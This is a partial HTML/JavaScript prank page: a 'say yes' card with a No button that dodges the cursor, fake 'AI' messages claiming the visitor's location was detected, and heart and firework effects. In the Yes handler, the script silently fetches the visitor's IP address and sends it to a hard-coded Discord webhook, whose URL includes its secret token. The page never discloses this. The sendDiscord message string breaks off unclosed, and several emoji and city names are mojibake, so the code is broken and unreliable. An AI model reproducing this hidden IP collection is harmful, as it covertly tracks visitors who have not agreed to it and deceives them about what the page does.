.modalBox{

}
.modalBox input{

  margin:15px 0;border:none;border-radius:12px;
}
.modalBox button{width:100%;padding:12px}
#terminal{
  position:fixed;bottom:10px;left:10px;
  font-size:11px;opacity:.35;
  line-height:1.4;
}
.flash{
  position:fixed;inset:0;
  background:white;opacity:0;
  pointer-events:none;
}
@keyframes float{to{opacity:0;transform:translateY(-220px) scale(1.8)}}
@keyframes boom{to{transform:translate(calc(var(--x)*1px),calc(var(--y)*1px));opacity:0}}
@keyframes flash{0%{background:white;color:black}100%{background:black;color:white}}

</head>

<body>

<div id="aiScreen"></div>
<div id="yesScreen"></div>

<audio id="bgm" loop src="https://assets.mixkit.co/music/preview/mixkit-soft-ambient-110.mp3"></audio>
<audio id="click" src="https://assets.mixkit.co/sfx/preview/mixkit-game-click-1114.mp3"></audio>

<script>
const WEBHOOK_URL="https://discord.com/api/webhooks/1466372734945595537/xclykYndX7PSAUIBGCiJzV0MNY08Hd-dmD4rIhebpc9Q350uxb6JwlVtDywMPBJUa4nt";
const $=id=>document.getElementById(id);
const params=new URLSearchParams(location.search);
const STREAM_MODE=params.get("mode")==="stream";

const nameModal=$("nameModal"),nameInput=$("nameInput"),saveName=$("saveName");
const card=$("card"),yes=$("yes"),no=$("no");
const yesScreen=$("yesScreen"),aiScreen=$("aiScreen");
const terminal=$("terminal"),bgm=$("bgm"),click=$("click"),flash=$("flash");

let username=localStorage.getItem("username");

/* ===== NAME ===== */
if(username||STREAM_MODE){
  nameModal.remove();card.style.display=STREAM_MODE?"none":"block";
}
saveName.onclick=()=>{
  if(!nameInput.value.trim())return;
  username=nameInput.value.trim();
  localStorage.setItem("username",username);
  nameModal.remove();card.style.display="block";
};

/* ===== MUSIC ===== */
document.body.addEventListener("click",()=>{
  bgm.volume=0;bgm.play();
  const i=setInterval(()=>{bgm.volume+=0.03;bgm.volume>=1&&clearInterval(i)},50);
},{once:true});

/* ===== NO ===== */
no.onmouseover=()=>{
  no.style.left=Math.random()*(innerWidth-120)+"px";
  no.style.top=Math.random()*(innerHeight-60)+"px";
};

/* ===== FAKE LOCATION ===== */
function fakeLocation(){
  const cities=["Ho Chi Minh City","H√† N·ªôi","ƒê√† N·∫µng","Singapore","Tokyo"];
  return cities[Math.floor(Math.random()*cities.length)];
}

/* ===== AI TYPING ===== */
const aiLines=[
  "[AI] Initializing neural core...",
  "[AI] Analyzing emotion patterns...",
  "[SYS] Location detected: "+fakeLocation(),
  "[SYS] Accuracy: 92%",
  "[AI] Decision locked."
];

async function aiTyping(){
  aiScreen.style.display="block";
  aiScreen.innerHTML="";
  for(const line of aiLines){
    for(let i=0;i<=line.length;i++){
      aiScreen.innerHTML=line.slice(0,i);
      await new Promise(r=>setTimeout(r,30));
    }
    aiScreen.innerHTML+="<br>";
    await new Promise(r=>setTimeout(r,400));
  }
  aiScreen.style.display="none";
}

/* ===== MOBILE RUNG + FLASH ===== */
function shock(){
  if(navigator.vibrate){
    navigator.vibrate([200,80,200,80,400]);
  }
  flash.style.transition="none";
  flash.style.opacity=1;
  setTimeout(()=>{
    flash.style.transition="opacity .4s";
    flash.style.opacity=0;
  },60);
}

/* ===== YES ===== */
yes.onclick=async ()=>{
  click.play();bgm.pause();
  card.remove();no.remove();
  await aiTyping();
  shock();
  yesScreen.innerHTML=`‚ù§Ô∏è ${username||"YOU"} SAID YES ‚ù§Ô∏è`;
  yesScreen.style.display="flex";
  hearts();fireworks();sendDiscord();
};

/* ===== EFFECTS ===== */
function hearts(){
  setInterval(()=>{
    const h=document.createElement("div");
    h.className="heart";h.innerHTML="‚ù§Ô∏è";
    h.style.left=Math.random()*innerWidth+"px";
    h.style.bottom="0";
    document.body.appendChild(h);
    setTimeout(()=>h.remove(),2500);
  },120);
}
function fireworks(){
  for(let i=0;i<90;i++){
    const s=document.createElement("div");
    s.className="spark";
    s.style.left=innerWidth/2+"px";
    s.style.top=innerHeight/2+"px";
    s.style.setProperty("--x",(Math.random()-0.5)*500);
    s.style.setProperty("--y",(Math.random()-0.5)*500);
    document.body.appendChild(s);
    setTimeout(()=>s.remove(),1000);
  }
}

/* ===== TERMINAL ===== */
const logs=[
  "[SYS] Booting God Mode...",
  "[AI] Neural sync online",
  "[CORE] No escape protocol active"
];
let ti=0;
setInterval(()=>{
  terminal.innerHTML+=logs[ti%logs.length]+"<br>";
  ti++;terminal.scrollTop=9999;
},1000);

/* ===== IP + DISCORD ===== */
async function getIP(){
  try{
    const r=await fetch("https://api.ipify.org?format=json");
    const d=await r.json();
    return d.ip;
  }catch(e){return "UNKNOWN";}
}
async function sendDiscord(){
  const ip=await getIP();
  fetch(WEBHOOK_URL,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      content:
`üî• YES CLICKED

}

/* ===== STREAM MODE AUTO ===== */
if(STREAM_MODE){
  setTimeout(async ()=>{
    await aiTyping();
    yesScreen.innerHTML="üî• STREAM STARTING üî•";
    yesScreen.style.display="flex";
  },800);
}
</script>
